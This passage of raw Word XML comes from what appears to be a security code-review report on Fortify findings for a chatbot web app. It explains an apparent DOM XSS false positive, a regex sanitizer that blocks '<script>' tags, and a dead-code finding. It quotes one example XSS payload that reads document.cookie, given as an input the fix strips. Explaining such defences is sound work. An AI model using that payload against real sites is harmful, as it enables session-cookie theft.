              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1041C610" w14:textId="156FCFD0" w:rsidR="001237B1" w:rsidRDefault="009E1274" w:rsidP="009E1274">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="109" w:name="_Ref200044561"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>19</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="109"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00145F00">
        <w:t>Cross-Site Scripting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BCB1969" w14:textId="77777777" w:rsidR="009E1274" w:rsidRDefault="0055386A" w:rsidP="009E1274">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="0055386A">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A721E00" wp14:editId="159342E3">
            <wp:extent cx="5733415" cy="502920"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="472080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080492" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId28"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5733415" cy="502920"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FF1C98" w14:textId="326FF00A" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="009E1274" w:rsidP="003C1260">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="110" w:name="_Ref200044578"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>20</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="110"/>
      <w:r>
        <w:t xml:space="preserve">: Mitigate </w:t>
      </w:r>
      <w:r w:rsidRPr="007D2F94">
        <w:t>Cross-Site Scripting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578C36A3" w14:textId="142B5B80" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="111" w:name="_Toc200039309"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Cross-Site Scripting: DOM</w:t>
      </w:r>
      <w:bookmarkEnd w:id="111"/>
    </w:p>
    <w:p w14:paraId="39E846A2" w14:textId="72E5624A" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">During code review, Fortify flagged a potential DOM XSS issue in the line that concatenates </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>eddi.botId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to form the URL of an AJAX call </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:color w:val="000080"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:color w:val="000080"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:color w:val="000080"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859430 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:color w:val="000080"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:color w:val="000080"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:color w:val="000080"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233AF8A7" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">However, this is a </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>false positive</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. The value of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>eddi.botId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, although derived from the URL and therefore controllable by the user, is never injected directly into the DOM as HTML content or passed to functions such as </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>document.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, or eval. Instead, it is used exclusively to compose path strings for HTTP requests (AJAX or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>href</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> attribute assignments for links), without ever entering a rendering or client-side code execution context. In a true DOM XSS attack, a malicious input would need to reach a point where the browser interprets content as code, for example, by inserting a &lt;script&gt; tag or JavaScript attribute into a DOM element, which does not happen in this flow. Consequently, although Fortify detects a simple concatenation of variables in the URL, there is no “sink” operation (such as assignment to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) that makes the attack effective, confirming the absence of a real vulnerability at this point.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B109519" w14:textId="77777777" w:rsidR="00344C2C" w:rsidRDefault="001A39A9" w:rsidP="00344C2C">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="11523108" wp14:editId="07777777">
            <wp:extent cx="5731200" cy="787400"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1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9"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="787400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="747D5E46" w14:textId="0BE598D7" w:rsidR="00910649" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="112" w:name="_Ref199859430"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>21</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="112"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="004B562E">
        <w:t>Vulnerable XSS DOM code found by fortify</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D9BB8DE" w14:textId="77777777" w:rsidR="00344C2C" w:rsidRPr="00344C2C" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C596316" w14:textId="5E61F6D2" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="113" w:name="_Toc200039310"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Cross-Site Scripting: Self</w:t>
      </w:r>
      <w:bookmarkEnd w:id="113"/>
    </w:p>
    <w:p w14:paraId="6B373A64" w14:textId="27E36C2F" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">To fix this issue was added a sanitization and validation layer on server sides to prevent any attempt to inject scripts into the bot’s replies. In particular, any data that comes from the configuration JSON is checked and sanitized using regular expressions for detection of &lt;script&gt; tags and suspicious patterns, which once found are replaced by harmless placeholders before </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Thymeleaf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> processes the template. This way, should an attacker try to include a malicious script such as &lt;script&gt;alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)&lt;/script&gt;, the script would be eliminated before the reply was created replacing not allowed word as</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> “&lt;script&gt;”</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> with “</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CONTENT NOT ALLOWED”</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859493 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>), and therefore the hacker would not be able to make any unauthorized request or perform any other malicious action (</w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859456 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042FF33E" w14:textId="77777777" w:rsidR="00344C2C" w:rsidRDefault="001A39A9" w:rsidP="00344C2C">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="4C135E41" wp14:editId="07777777">
            <wp:extent cx="5731200" cy="2451100"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="38"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30"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731200" cy="2451100"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E933A82" w14:textId="1CDE7B94" w:rsidR="00344C2C" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="114" w:name="_Ref199859456"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>22</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="114"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00A23ACF">
        <w:t>XSS sanitization</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109F9CF7" w14:textId="6AEC3EBE" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF845C3" w14:textId="77777777" w:rsidR="00344C2C" w:rsidRDefault="001A39A9" w:rsidP="00344C2C">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="3FEDAC7E" wp14:editId="07777777">
            <wp:extent cx="5619750" cy="1790700"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="3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1"/>
                    <a:srcRect l="1993"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5619750" cy="1790700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D41C3F" w14:textId="11DFF78A" w:rsidR="00910649" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="115" w:name="_Ref199859493"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>23</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:bookmarkEnd w:id="115"/>
      <w:r w:rsidR="001A39A9">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="001A39A9" w:rsidRPr="0027676F">
        <w:t>XSS mitigation in template generation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B98AFCC" w14:textId="77777777" w:rsidR="000A5824" w:rsidRPr="000A5824" w:rsidRDefault="000A5824" w:rsidP="000A5824">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D072C0D" w14:textId="6F46AE67" w:rsidR="00910649" w:rsidRPr="00993D80" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="116" w:name="_Toc200039311"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Dead Code: Expression is Always true</w:t>
      </w:r>
      <w:bookmarkEnd w:id="116"/>
    </w:p>
    <w:p w14:paraId="7666CE9F" w14:textId="7BF19434" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The error is related to the “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deepCopy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>” (</w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859531 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) and “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cacheName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>” variables (</w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859563 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> REF _Ref199859599 \h </w:instrText>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00257ECB" w:rsidRPr="00257ECB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r w:rsidR="00344C2C">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">), it means that all the expressions with these two variables are always true, so useless. It is a </w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>false positive</w:t>
      </w:r>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> because the variables aren’t always different to null (in the case of “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cacheName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>”) or aren’t always true (in case of “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>deepCopy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>”).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D46C4F" w14:textId="77777777" w:rsidR="00344C2C" w:rsidRDefault="001A39A9" w:rsidP="00344C2C">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="114300" distB="114300" distL="114300" distR="114300" wp14:anchorId="08CB08F5" wp14:editId="07777777">
            <wp:extent cx="4405313" cy="2751491"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="43"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2"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4405313" cy="2751491"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4C026C" w14:textId="6F11AE28" w:rsidR="00344C2C" w:rsidRDefault="00344C2C" w:rsidP="00344C2C">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="117" w:name="_Ref199859531"/>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00AD7B7C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>24</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
